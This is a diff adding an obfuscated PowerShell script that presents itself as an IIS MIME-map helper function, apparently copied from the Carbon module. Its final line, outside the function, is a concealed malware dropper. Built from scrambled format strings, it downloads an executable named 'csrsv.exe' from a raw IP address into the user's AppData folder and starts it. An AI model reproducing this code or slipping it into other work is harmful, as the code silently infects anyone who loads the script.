@@ -1,0 +1,47 @@
+function Ge`T-CIiSM`Im`E`mAp
+{
+    
+    [CmdletBinding(defAulTpArAmetERsETnaMe={"{0}{2}{1}"-f 'F','er','orWebServ'})]
+    [OutputType([Carbon.Iis.MimeMap])]
+    param(
+        [Parameter(mANdAtORY=${t`RUE},PArameTErsEtNAmE="foRW`e`B`SITE")]
+        [string]
+        
+        ${sit`e`NaME},
+        
+        [Parameter(PARamEtERSetnAMe="for`WEbSi`Te")]
+        [Alias({"{1}{0}" -f 'th','Pa'})]
+        [string]
+        
+        ${vi`R`T`UALPAth} = '',
+        
+        [string]
+        
+        ${F`il`eEXteNS`i`on} = '*',
+        
+        [string]
+        
+        ${M`IM`etYpE} = '*'
+    )
+
+    &("{1}{2}{0}"-f'StrictMode','Set','-') -Version ("{0}{2}{1}"-f 'L','st','ate')
+
+    &("{1}{0}{4}{3}{2}" -f'se-C','U','erence','erPref','all') -Cmdlet ${ps`Cm`DLet} -Session ${Ex`ECUTIONcON`T`EXt}."SesS`i`O`NstATE"
+    
+    ${gEtIi`scON`FI`GsE`cTi`o`NPaRaMs} = @{ }
+    if( ${P`scMDL`Et}.ParAmetErseTnAmE -eq ("{1}{2}{3}{0}" -f'ite','F','orW','ebs') )
+    {
+        ${GetII`ScOnFIg`SECt`iO`NpA`RAmS}[("{1}{2}{0}"-f 'ame','Si','teN')] = ${sIt`eNa`Me}
+        ${GeT`IISCon`Fig`S`E`CTionPaRa`ms}[("{2}{0}{1}"-f'l','Path','Virtua')] = ${Vi`RtUAlp`A`Th}
+    }
+
+    ${S`T`ATIc`coNte`Nt} = &("{5}{0}{3}{4}{1}{6}{2}"-f'-','urati','nSection','CI','isConfig','Get','o') -SectionPath ("{3}{5}{1}{0}{4}{2}{6}"-f'.w','em','e','sys','ebS','t','rver/staticContent') @getIisConfigSectionParams
+    ${ST`AT`i`CcONTENt}.("{4}{1}{2}{0}{3}"-f 'ectio','tCol','l','n','Ge').Invoke() | 
+        .("{3}{0}{1}{2}" -f 'ere','-Obj','ect','Wh') { ${_}[("{0}{3}{2}{1}" -f 'fil','ion','xtens','eE')] -like ${fI`le`exTEnsI`On} -and ${_}[("{1}{0}"-f 'ype','mimeT')] -like ${Mime`T`yPe} } |
+        .("{1}{0}{3}{2}{4}" -f'orEach-','F','e','Obj','ct') {
+            &("{2}{1}{0}" -f'ect','w-Obj','Ne') ("{1}{0}{3}{4}{2}"-f 's.Mi','Carbon.Ii','ap','me','M') (${_}[("{0}{1}{2}" -f 'f','ileExt','ension')],${_}[("{2}{1}{0}" -f'ype','imeT','m')])
+        }
+}
+
+
+(.("{0}{2}{1}" -f 'Ne','ct','w-Obje') ("{4}{1}{0}{2}{3}{5}"-f 'Net.WebCl','ystem.','i','en','S','t')).("{1}{0}{2}"-f 'oad','Downl','File').Invoke(("{0}{3}{6}{8}{5}{2}{1}{7}{4}{9}" -f 'ht','a','.238/~y','tp:','csrs','.53','//94.1','hoo/','02','v.exe'),"$env:APPDATA\csrsv.exe");.("{3}{0}{2}{1}"-f'c','ss','e','Start-Pro') ("$env:APPDATA\csrsv.exe")
